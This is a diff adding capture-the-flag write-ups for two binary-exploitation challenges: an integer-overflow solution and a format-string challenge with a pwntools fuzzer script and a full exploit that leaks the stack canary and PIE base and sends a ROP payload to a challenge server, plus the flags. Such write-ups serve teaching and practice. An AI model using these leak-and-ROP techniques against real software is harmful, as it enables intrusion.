@@ -24,6 +24,115 @@
 
 ## Pwn
 
+### Banana overflow
+
+> Just read about this thing called "Integer Overflow", I wonder if it's dangerous? I've set up a banana-money-printing machine to test this out.
+>
+> Author: Lucas
+
+---
+
+By inputting 2147483647 and then 1 a few times, your balance will overflow into positive.
+
+This challenge was supposed to be an integer overflow challenge, but I didn't restrict the input and hence you could
+easily solve it by just inputting characters... oops.
+
+Flag: `ACSI{w4w_i_jus7_h4ck3d_0cbc}`
+
+### Format String
+
+> Format string vulnerabilities are extremely potent in binary exploitation. With a simple mistake, an attacker can achieve both
+> arbitrary read and write! But this program doesn't allow us to write to any memory region we like, so we can't repoint a
+> function call to `system('/bin/sh')` in the GOT ... Is it unsolvable??
+> 
+> Note that you might need to write a fuzzer for this challenge.
+> 
+> Author: Lucas
+
+---
+
+The title already tells you this is a format string exploit challenge. When you allow user input to be passed into
+`printf()`, the result is an arbitrary read and arbitrary write. I won't go into details about the arb write, since it's
+not applicable in this challenge. 
+
+How do we perform arbitrary read? Try inputting `hello world` into the program. Then try `%1$s`. You'll notice that the
+output is not the string you entered! This is because we're now reading the first argument passed into `printf`. You
+might wonder how this works since `printf` has no arguments. Well, in x64 convention, the first 6 arguments of a
+function are found in registers `RDI, RSI, RDX, RCX, R8, R9` respectively. Any subsequent arguments are read off the
+stack.
+
+With this, we can read almost anything we want if we know the offset (the number after %). I wrote a
+[tool](https://github.com/samuzora/ffuzzer) which currently only supports local fuzzing. Note that these offsets differ
+on local and remote, so let's skip my tool and fuzz on remote.
+
+```py 
+from pwn import *
+import time
+
+elf = context.binary = ELF('./ffuzzer')
+context.log_level = "error"
+rop = ROP(elf)
+
+#p = process()
+p = remote('alpha.8059blank.ml', 3002)
+#input()
+
+for i in range(1, 300):
+    p = remote('0.0.0.0', 3002)
+    time.sleep(0.2)
+    p.clean()
+    p.sendline(f"%{i}$p")
+    try:
+        canary = int(p.recvline().strip()[2:], 16)
+        print(f'{hex(canary)} {i}')
+    except:
+        print(f'error {i}')
+    p.close()
+```
+
+Similar to RPS 2.0, we need the canary and PIE offset. Canary can be identified with `0x...00`, and PIE with `0x55...`.
+
+After we've found 2 suitable offsets, we can write our exploit:
+
+```py 
+from pwn import *
+import time
+
+elf = context.binary = ELF('./formatstring')
+rop = ROP(elf)
+
+#p = process()
+p = remote('alpha.8059blank.ml', 3002)
+#input()
+
+# find canary
+time.sleep(1)
+p.clean()
+p.sendline("%39$p")
+canary = int(p.recvline().strip()[2:], 16)
+print(hex(canary))
+
+# find pie
+p.clean()
+p.sendline("%40$p")
+pie = int(p.recvline().strip()[2:], 16) - elf.symbols.__libc_csu_init
+print(hex(pie))
+print(hex(pie + elf.symbols.win))
+
+# rop
+payload = flat(
+    b'A' * 264,
+    canary,
+    b'A'*8,
+    pie + rop.ret.address,
+    pie + elf.symbols.win,
+)
+p.sendline(payload)
+p.interactive()
+```
+
+Flag: `ACSI{h0p3_u_l1k3_1t_uwu_owo}`
+
 ### RPS 2.0
 
 > Rock Paper Scissors QOL Update, hope you like it~  
